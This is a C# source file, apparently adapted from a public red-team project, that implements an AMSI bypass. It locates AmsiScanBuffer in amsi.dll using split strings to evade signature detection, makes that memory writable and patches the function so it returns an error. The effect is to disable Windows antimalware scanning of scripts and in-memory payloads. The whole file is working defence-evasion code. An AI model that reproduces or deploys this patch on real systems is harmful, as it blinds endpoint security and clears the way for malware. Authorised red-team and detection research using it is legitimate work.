// https://www.cyberark.com/threat-research-blog/amsi-bypass-redux/
// https://github.com/rasta-mouse/AmsiScanBufferBypass
// iex 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'

using System;
using System.Runtime.InteropServices;

namespace AMSI
{
    public class Bypass
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

        public static int Disable()
        {

            IntPtr Address = GetProcAddress(LoadLibrary("am" + "si" + ".dl" + "l"), "Am" + "si" + "Scan" + "Buffer");

            UIntPtr size = (UIntPtr)5;
            uint p = 0;

            VirtualProtect(Address, size, 0x40, out p);

            Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

            IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);

            Marshal.Copy(Patch, 0, unmanagedPointer, 6);


            MoveMemory(Address, unmanagedPointer, 6);

            return 0;
        }
    }
}